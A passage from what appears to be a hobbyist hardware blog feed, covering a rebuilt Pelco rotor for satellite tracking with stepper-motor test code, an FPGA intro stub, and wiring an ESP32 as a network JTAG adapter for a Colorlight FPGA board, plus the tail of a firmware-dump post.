        <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"%08x: %08x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">flashData</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"DONE"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{}</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Hardware Hacking" /><category term="Protected Firmware" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="STM32" /><category term="Patreon" /><category term="MCU" /><summary type="html"><![CDATA[In the process of my hobby hardware hacking, I encountered a Chinese clone of a HASP HL dongle equipped with a STM32F042G6U6 processor. My intention was to clone it, and during my exploration, I discovered four pins from the SWD debug interface located at the bottom of the PCB. I soldered a 4-pin header to these pins for ease of access.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Antenna Rotor - Part 2</title><link href="https://lucasteske.dev/2021/04/rotor-antenna-parte-2" rel="alternate" type="text/html" title="Antenna Rotor - Part 2" /><published>2021-04-01T05:23:00+00:00</published><updated>2021-04-01T05:23:00+00:00</updated><id>https://lucasteske.dev/2021/04/rotor-antenna-parte-2</id><content type="html" xml:base="https://lucasteske.dev/2021/04/rotor-antenna-parte-2"><![CDATA[<p>Continuing the tracker project, I managed to make some significant progress. As Demilson (PY2UEP) had cut the original motors, I did the same. The azimuth motor was too rusted and I eventually destroyed one of the coils (which I wanted to salvage the wire), but in the end the shaft went out.</p>

<hr />

<p>After removing the shaft, I broke the magnet with a hammer until there was any piece left. That way, the only thing that would be left there is the shaft and the hexagon magnet support.</p>

<p><img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft.jpg" alt="Hexagon Magnet Support 1" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft2.jpg" alt="Hexagon Magnet Support 2" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft3.jpg" alt="Hexagon Magnet Support 3" /><em>Motor shaft showing the hexagon support</em></p>

<p>For the elevation motor, I made a cut in a circular mark around the exit of the shaft. That way I could use the same support for coupling with the reduction gears.</p>

<p><img src="/assets/posts/tracker-mount-2/elevation-shaft-support.jpg" alt="&quot;lid&quot; of the elevation motor after cut" /><em>“lid” of the elevation motor after cut</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-support-with-reduction.jpg" alt="Lid + Reduction Gears" /><em>Lid + Reduction Gears</em>
<img src="/assets/posts/tracker-mount-2/elevation-motor-parts2.jpg" alt="Motor Pieces" /><em>Motor Pieces</em></p>

<p>For the shaft, it was nescessary to reduce its size and made a bevel so I could fit it better in a 3D Printed part. To do so, I use two plywood pieces to hold the shaft while me and my father cut it. For the bevel, we used a grinder.</p>

<p><img src="/assets/posts/tracker-mount-2/elevation-shaft-cut.jpg" alt="Plywood and cutted shaft" /><em>Plywood and cutted shaft</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-support-with-shaft.jpg" alt="Cutted Shaft on motor head" /><em>Cutted Shaft on motor head</em></p>

<p>With that, I could then start the 3D Drawings for the adapters.</p>

<h2 id="3d-prints">3D Prints</h2>

<p>After A LOT of trial and error, I managed to make good fittings between the shafts. But then I realized a problem: The space for the azimuth axis was <strong>extremelly</strong> limited, in the way that my 40 mm NEMA17 motors were too big for it.</p>

<p><img src="/assets/posts/tracker-mount-2/try-azimuth-44adapter.jpg" alt="Azimuth Adapter" />
<img src="/assets/posts/tracker-mount-2/try-azimuth-44adapter-place.jpg" alt="Azimuth Adapter" /><em>Azimuth Adapter</em></p>

<p>Then I had to buy some “slim” motors to use in that place. I got a bit concerned with the final torque, but my attempts to make gears and other stuff were all failed. The motors I bought in Aliexpress (see links in the end of this post)</p>

<p>While the motor wasn’t arriving, I started optimizing the adapters to be the shortest as possible, saving all space I could. I use <a href="https://www.freecadweb.org/">FreeCAD</a> for being free and where I can do faster / better drawings. But don’t assume I’m a 3D Designer, because I’m not. My parts are only “functional”.</p>

<p><img src="/assets/posts/tracker-mount-2/azimuth-shaft-adapter.jpg" alt="Azimuth Shaft Adapter" /><em>Azimuth Shaft Adapter</em>
<img src="/assets/posts/tracker-mount-2/azimuth-support.jpg" alt="Azimuth Support" /><em>Azimuth Support</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-adapter.jpg" alt="Elevation Shaft Adapter" /><em>Elevation Shaft Adapter</em>
<img src="/assets/posts/tracker-mount-2/elevation-motor-adapter.jpg" alt="Elevation Adapter" /><em>Elevation Adapter</em>
<img src="/assets/posts/tracker-mount-2/exploded-elevation-shaft.jpg" alt="" /></p>

<p>And the first axis to work was the elevation. To do so I used 40 mm NEMA17 motors (link in end of this post), which came with a closed-loop magnetic encoder driver. But in the end I went to use a TMC2209 to control instead the board that came in because it was easier and quieter.</p>

<p><img src="https://www.youtube.com/watch?v=cfUtCqb3oxA" alt="" />
<img src="https://www.youtube.com/watch?v=ENTpTZaiXl4" alt="" /></p>

<p>After the new azimuth motors arrived, I just tried to fit everything. And it did! se ia caber. E coube!</p>

<p><img src="/assets/posts/tracker-mount-2/assembled-azimuth-support.jpg" alt="Azimuth" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-inplace.jpg" alt="Azimuth Motor in place" /></p>

<p>And also working!</p>

<p><img src="https://www.youtube.com/watch?v=-4U-ofHaF0E" alt="" /></p>

<p>After everything was working, I did some tests to check what was the final resolution and reduction for both axis. To do so, I used the following code with an ESP32 to control the TMC2209 drivers, and for angle measurement I used my phone attached to the elevation base.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;TMCStepper.h&gt;</span><span class="cp">
</span>
<span class="cp">#define STEP_PIN         12 // Step
#define EN_PIN           23 // Enable
</span>
<span class="cp">#define SERIAL_PORT Serial2 // TMC2208/TMC2224 HardwareSerial port
#define DRIVER_ADDRESS 0b00 // TMC2209 Driver address according to MS1 and MS2
</span>
<span class="cp">#define R_SENSE 0.11f 
</span>
<span class="n">TMC2209Stepper</span> <span class="nf">driver</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SERIAL_PORT</span><span class="p">,</span> <span class="n">R_SENSE</span><span class="p">,</span> <span class="n">DRIVER_ADDRESS</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">pinMode</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
  <span class="n">pinMode</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
  
  <span class="n">SERIAL_PORT</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>      <span class="c1">// HW UART drivers</span>
  <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>

  <span class="n">driver</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>                 <span class="c1">// UART: Init SW UART (if selected) with default 115200 baudrate</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">toff</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>                <span class="c1">// Enables driver in software</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">rms_current</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>       <span class="c1">// Set motor RMS current</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">microsteps</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>           <span class="c1">// Set microsteps to 1/16th</span>

  <span class="n">driver</span><span class="p">.</span><span class="n">en_spreadCycle</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>    <span class="c1">// Toggle spreadCycle on TMC2208/2209/2224</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">pwm_autoscale</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>      <span class="c1">// Needed for stealthChop</span>

  <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"OK"</span><span class="p">);</span>
  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">bool</span> <span class="n">shaft</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
<span class="c1">//  Serial.println("TURN");</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">Serial</span><span class="p">.</span><span class="n">available</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">z</span> <span class="o">=</span> <span class="n">Serial</span><span class="p">.</span><span class="n">read</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">z</span> <span class="o">==</span> <span class="sc">'a'</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Stepping 10000"</span><span class="p">);</span>
      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
      <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">delayMicroseconds</span><span class="p">(</span><span class="mi">350</span><span class="p">);</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">delayMicroseconds</span><span class="p">(</span><span class="mi">350</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">z</span> <span class="o">==</span> <span class="sc">'b'</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">shaft</span> <span class="o">=</span> <span class="o">!</span><span class="n">shaft</span><span class="p">;</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"Shaft direction: "</span><span class="p">);</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">shaft</span><span class="p">);</span>
      <span class="n">driver</span><span class="p">.</span><span class="n">shaft</span><span class="p">(</span><span class="n">shaft</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The results were:</p>

<ul>
  <li>Elevation Axis
    <ul>
      <li>Aproximated Reduction: 1:3500</li>
      <li>Angular Resolution: 0,000117 deg / step</li>
      <li>Maximum Speed: 0,62 deg / s</li>
    </ul>
  </li>
  <li>Azimuth Axis
    <ul>
      <li>Aproximated Reduction: 1:392</li>
      <li>Angular Resolution: 0,0046 deg / step</li>
      <li>Maximum speed: 6,3 deg / s</li>
    </ul>
  </li>
</ul>

<p>The results looks promissing and, if everything goes right, will be enough for tracking satellites!</p>

<p>The next step is to code / assemble the required software/hardware to control it through network!</p>

<p>The 3D Models (Both freecad and STL) are available in Thingverse (see links section)</p>

<h2 id="links">Links</h2>

<ul>
  <li><a href="https://s.click.aliexpress.com/e/_AOhCSe">Azimuth Motor</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_ADtVZs">Elevation Motor (Closed-Loop)</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_9zgziK">Elevation Motor (Normal)</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_AoG3ZC">TMC2209 Drivers</a></li>
  <li><a href="https://www.thingiverse.com/thing:4813288">STL / Freecad Files</a></li>
</ul>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Airspy" /><category term="EMWIN" /><category term="English" /><category term="GOES" /><category term="Hearsat" /><category term="LRIT" /><category term="RE" /><category term="Reverse Engineering" /><category term="Sat" /><category term="Satellite" /><category term="SDR" /><summary type="html"><![CDATA[Continuing the tracker project, I managed to make some significant progress. As Demilson (PY2UEP) had cut the original motors, I did the same. The azimuth motor was too rusted and I eventually destroyed one of the coils (which I wanted to salvage the wire), but in the end the shaft went out.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/tracker-mount-2/assembled-elevation-shaft.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/tracker-mount-2/assembled-elevation-shaft.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Antenna Rotor - Part 1</title><link href="https://lucasteske.dev/2021/03/rotor-antenna-parte-1" rel="alternate" type="text/html" title="Antenna Rotor - Part 1" /><published>2021-03-03T23:57:00+00:00</published><updated>2021-03-03T23:57:00+00:00</updated><id>https://lucasteske.dev/2021/03/rotor-antenna-parte-1</id><content type="html" xml:base="https://lucasteske.dev/2021/03/rotor-antenna-parte-1"><![CDATA[<p>A few years ago I bought a Pelco Câmera Rotor, model PT175-24P. This rotor is made for carrying a camera with up to 8kg, and contains two biphase reversable motors internally. My idea was (and is) to put a satellite dish coupled, and control its movement to track satellites. Then I could use it to receive Low Orbit Satellites.</p>

<p><img src="/assets/posts/tracker-mount/motor-schematic.jpg" alt="Internal Schematics" /><em>Internal Schematics</em></p>

<hr />

<p>The problem of the original system from pelco, is that they’re two 24V AC Motors, which would require a VFD (Variable Frequency Driver) to control the speed and a closed-loop system with a angle sensor. That would make it a bit complex to control the antenna, so a friend of my (PY2UEP) suggested to modify it to use stepper motors instead. The big advantage of stepper motors is that their steps always has the same length. So if the motor goes N steps in one direction and then N steps in the oposite direction, it will return <strong>exactly</strong> where it started. That allows for open-loop circuits (where you just calibrate the start and then you dont need a feedback to fix everything).</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_20-56-30.jpg" alt="Stepper Motor" /><em>Stepper Motor</em></p>

<h1 id="make-the-cleaning">Make the cleaning</h1>

<p>Then I started opening the rotor and make a super-clean. Remove all old grease and dust.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-02_20-19-46.jpg" alt="Pelco Interior" /><em>Pelco Interior</em>
<img src="/assets/posts/tracker-mount/photo_2021-03-02_20-19-46-2.jpg" alt="Pelco Interior" /><em>Pelco Interior</em></p>

<p>I disassembled everything and then made a querosene bath to remove grease from everywhere. Two of the azimuth rollers were well stuck (the grease was so dry that it looked like a glue), so I left in the querosene until the next day and then cleaned up with a paint brush. After all the cleaning, the rollers looks new!</p>

<p><img src="https://www.youtube.com/watch?v=9Y2FpSlNss8" alt="" /></p>

<p>The rest of the parts I basically tossed inside a bucket and filled with querosene with a bit of water. Then I started stiring the parts inside. After a while, I let it sit and made several washes with water and soap to remove all querosene.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_19-23-52.jpg" alt="Bucket with parts" /><em>Bucket with washed parts</em></p>

<p>The belts I left on the querosene for a few minutes and then used a paint brush to remove all stuck pieces of grease.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_19-23-53.jpg" alt="Belts" /><em>Belts in querosene</em></p>

<p>After all clean-up, I started the re-assembly by putting the two azimuth rollers in place. The one from below is stuck inside the piece under pressure, so I needed to use a hammer. With a lot of care, I managed to push the piece until it fit perfectly with the surface of the base. After that I pushed the azimuth axis through the roller.</p>

<p><img src="https://www.youtube.com/watch?v=5wpSKRn5RnM" alt="" /></p>

<p>Just after that, I put the reduction gears and the azimuth belt in place.</p>

<p><img src="https://www.youtube.com/watch?v=bE6B3GejGmA" alt="" /></p>

<p>After that, everything was easy: just screw everything together. In the end I left it open so I could plan the position of the stepper motors:</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-51-36.jpg" alt="Open Pelco Mount" /><em>Open Pelco Mount</em></p>

<p>The next step is to disassemble the original motors and adapt the axis for the stepper motors!</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-56-26-2.jpg" alt="Azimuth Motor" /><em>Azimuth Motor</em></p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-56-26.jpg" alt="Elevation Motor" /><em>Elevation Motor</em></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Airspy" /><category term="EMWIN" /><category term="English" /><category term="GOES" /><category term="Hearsat" /><category term="LRIT" /><category term="RE" /><category term="Reverse Engineering" /><category term="Sat" /><category term="Satellite" /><category term="SDR" /><summary type="html"><![CDATA[A few years ago I bought a Pelco Câmera Rotor, model PT175-24P. This rotor is made for carrying a camera with up to 8kg, and contains two biphase reversable motors internally. My idea was (and is) to put a satellite dish coupled, and control its movement to track satellites. Then I could use it to receive Low Orbit Satellites.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/tracker-mount/head.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/tracker-mount/head.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Introduction to FPGA</title><link href="https://lucasteske.dev/2020/10/introducao-a-fpga" rel="alternate" type="text/html" title="Introduction to FPGA" /><published>2020-10-12T02:59:00+00:00</published><updated>2020-10-12T02:59:00+00:00</updated><id>https://lucasteske.dev/2020/10/introducao-a-fpga</id><content type="html" xml:base="https://lucasteske.dev/2020/10/introducao-a-fpga"><![CDATA[<p>(So far) Only available in <a href="/pt/2020/10/introducao-a-fpga">Portuguese</a></p>]]></content><author><name>Lucas Teske</name></author><category term="Portugues" /><category term="Hacking" /><category term="FPGA" /><category term="Hardware" /><category term="Eletrônica" /><category term="Verilog" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="Hardware" /><category term="Eletrônica" /><category term="Verilog" /><summary type="html"><![CDATA[(So far) Only available in Portuguese]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/FPGA.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/FPGA.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hacking a ESP32 into FPGA Board</title><link href="https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board" rel="alternate" type="text/html" title="Hacking a ESP32 into FPGA Board" /><published>2020-06-14T19:17:00+00:00</published><updated>2020-06-14T19:17:00+00:00</updated><id>https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board</id><content type="html" xml:base="https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board"><![CDATA[<h1 id="hacking-a-esp32-into-fpga-board">Hacking a ESP32 into FPGA Board</h1>

<p>Colorlight Hub 5A-75B V6.1 Board</p>

<p>Last year I saw a russian guy that found out that this cheap board (US$15~) had an Lattice ECP5 FPGA, which is compatible with Open Source Tool-chains for synthesis. He was running a RISC-V Core inside that and piping the serial through the ethernet ports. I wanted to get one and start playing by myself.
These boards are relatively cheap, about US$15 and contains a Lattice ECP5 FPGA ( LFE5U-25F-6BG381C ), 4MB DRAM, Two Gigabit Ethernet and several level shifters for I/O. This is good because:</p>

<ol>
  <li>That’s a very cheap board by the specs</li>
  <li>You can use open-source synth toolchain</li>
  <li>There is lots of 5V bi-directional level shifters</li>
</ol>

<p>I decided to give a shot and buy one from Aliexpress. Sadly because of the pandemic COVID-19, the package is long time delayed (still haven’t arrived yet, 3 months after I bought). Luckily I found it on Mercado Livre (the Brazilian eBay) to sell at a reasonable price.</p>

<p>When it arrived, I first tried to run the classic Hardware Hello World: The led blink. For that I got this project to test it: <a href="https://github.com/antonblanchard/ghdl-yosys-blink">https://github.com/antonblanchard/ghdl-yosys-blink</a></p>

<p>I did a fork to add the board constraints, and also a FT232R bitbang mode to OpenOCD (since it was the only JTAG adapter I had at the moment)[ see <a href="https://github.com/racerxdl/ghdl-yosys-blink">https://github.com/racerxdl/ghdl-yosys-blink</a> ]</p>

<p>I didn’t had to reverse engineer the board, since someone already did all the reverse engineer: <a href="https://github.com/q3k/chubby75/blob/master/5a-75b/hardware_V6.1.md">https://github.com/q3k/chubby75/blob/master/5a-75b/hardware_V6.1.md</a></p>

<p>The JTAG Headers are easy to access, and all pinouts are mapped. Great!</p>

<p>After few minutes tuning the ghdl-yosis-blink example I managed to make it work on my board. Still it was running on ram memory only and I wanted to write to SPI Flash. Lattice allows to write the SPI Flash using the jtag, so I started searching over the internet stuff that could convert the generated bitstream to program the flash. After testing lots of tools, I found out this simple tool did the job: <a href="https://github.com/f32c/tools/tree/master/ujprog">https://github.com/f32c/tools/tree/master/ujprog</a></p>

<p>I just had to run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ujprog <span class="nt">-d</span> <span class="nt">-j</span> flash <span class="nt">-s</span> vhdl_blink-flash.svf vhdl_blink.bit
</code></pre></div></div>

<p>And the generated vhdl_blink-flash.svf was persisting into the flash memory.</p>

<center>
  <blockquote class="twitter-tweet"><p lang="en" dir="ltr">After few days I managed to write thr SPI Flash using FT232H. Full <a href="https://twitter.com/hashtag/opensource?src=hash&amp;ref_src=twsrc%5Etfw">#opensource</a> stuff to program that board. Also only US$15. <a href="https://t.co/RujsOGwH1D">pic.twitter.com/RujsOGwH1D</a></p>&mdash; Cybernetic Lover (@lucasteske) <a href="https://twitter.com/lucasteske/status/1268616857583419393?ref_src=twsrc%5Etfw">June 4, 2020</a></blockquote> <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>

<p>Now that everything was working, I decided to make a bigger hack: I wanted an ESP32 to be attached in the board and program through network. It would also be nice if I could redirect a serial port to the network (useful for debug).</p>

<p>The first thing I did is chose a GPIO pair to be the TX/RX from the serial port. The ESP32 has three serial ports, but on my board only two of them were exposed (Serial 0 and 2). The Serial 0 port is attached to the USB-Serial converter onboard, so I decided to use the Serial 2 to communicate with the FPGA. After looking at the pinout, most of the Level Shifters pins are common (the address lines are half of the pins) and the ones close to the lower part of the board (which would be easier to solder) were the address lines. After poking around, I decided to remove the J4 connector and U23 level shifter (the ESP32 is 3.3V, remember that!)</p>

<p><img src="/assets/posts/medium/0_wK9QPXyVChE4n8py.jpeg" alt="U23 and J4 removed" /><em>U23 and J4 removed</em></p>

<p>I also decided to remove J3 to make easier to solder the bypass wires at that connector. Then I soldered all bypass wires to make it 3.3V instead 5V</p>

<p><img src="/assets/posts/medium/1_tT_gWmR6KPWXKKoewW-KDQ.png" alt="Bypass wires soldered in U23" /><em>Bypass wires soldered in U23</em></p>

<p>The 33 Ohm resistores are nice since it could avoid short circuits when wrong pins are associated to serial port. So I decided to keep then as is. After checking that all pins were OK and not shorted, I decided to use hot-glue to secure them:</p>

<p><img src="/assets/posts/medium/1_53DN-rC8MrNRfFdVmzN-Uw.png" alt="Hot-glue raw pieces" /><em>Hot-glue raw pieces</em></p>

<p>I always found out that using a heat-gun with 200ºC was better to hot-glue than the hot-glue gun. Also I would avoid heating the wires too much and letting them go.</p>

<p><img src="/assets/posts/medium/1_7O77I22KdFxtNz4-G2cSeA.png" alt="Heat gun with hot-glue" /><em>Heat gun with hot-glue</em></p>

<p>After cooling down, the results look really good:</p>

<p><img src="/assets/posts/medium/1_sCDf7DO_2mY2FoOTLN357Q.png" alt="Hot-glue on bypass wires" /><em>Hot-glue on bypass wires</em></p>

<p>Then I went to the back-side of the board to solder the VCC/GND pair and the TX/RX pair wires. Luckily the power input for this board is 3.6 to 6V and then I can use the VIN from ESP32 (which is attached to USB +5V) to power it. The power connector is also close to J4 we removed.</p>

<p><img src="/assets/posts/medium/1_sADN_JL_MLf9TP5r7FVymQ.png" alt="Power Connector and Serial Port" /><em>Power Connector and Serial Port</em></p>

<p>Then with some double-sided tape, I could attach the ESP32 to the side of the board and solder the wires to the right pins.</p>

<p><img src="/assets/posts/medium/1_86Ir5XIqvHCLbMsbWxs5MA.png" alt="ESP32 fixed with double-sided table and wires soldered" /><em>ESP32 fixed with double-sided table and wires soldered</em></p>

<p>Now I just had to choose some pins for the JTAG and we would be good to go! After searching for some safe pins on ESP32 I choose these:</p>

<ul>
  <li>TDI =&gt; D33</li>
  <li>TDO =&gt; D32</li>
  <li>TCK =&gt; D27</li>
  <li>TMS =&gt; D26</li>
</ul>

<p>And I soldered the wires as best looking as I could.</p>

<p><img src="https://cdn-images-1.medium.com/max/2544/0_ERp9fzhTj8EL0i1G" alt="" /></p>

<p>I also had to solder the GND of the ESP32 into the GND of the JTAG header (I had a problem the FT232R that was solved by attaching the GND to the header there)</p>

<p><img src="/assets/posts/medium/1_Ltxy34-3hHoAalgDOHqG7A.png" alt="JTAG Power Header" /><em>JTAG Power Header</em></p>

<p><img src="/assets/posts/medium/1_Sae7vuGGrvCUuYZdOiGPVA.png" alt="GND wire soldered" /><em>GND wire soldered</em></p>

<p>With all wires soldered, I could start playing with software!</p>

<p>At first I tried the OpenOCD Remote Bitbang which connects to TCP socket and start issuing bitbang commands by using a single ASCII character. For some reason I couldn’t make it work right. If you want to try by yourself:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;WiFi.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">ssid</span>     <span class="o">=</span> <span class="s">"XX"</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">password</span> <span class="o">=</span> <span class="s">"XX"</span><span class="p">;</span>

<span class="n">WiFiServer</span> <span class="nf">server</span><span class="p">(</span><span class="mi">3335</span><span class="p">);</span>

<span class="cp">#define PIN_SRST 21
#define PIN_TDI 33
#define PIN_TDO 32
#define PIN_TCK 27
#define PIN_TMS 26
#define PIN_LED 2
</span>
<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>
    <span class="n">delay</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>

    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TDO</span><span class="p">,</span> <span class="n">INPUT_PULLUP</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="c1">// We start by connecting to a WiFi network</span>

    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">();</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">();</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"Connecting to "</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">ssid</span><span class="p">);</span>

    <span class="n">WiFi</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="n">ssid</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">WiFi</span><span class="p">.</span><span class="n">status</span><span class="p">()</span> <span class="o">!=</span> <span class="n">WL_CONNECTED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
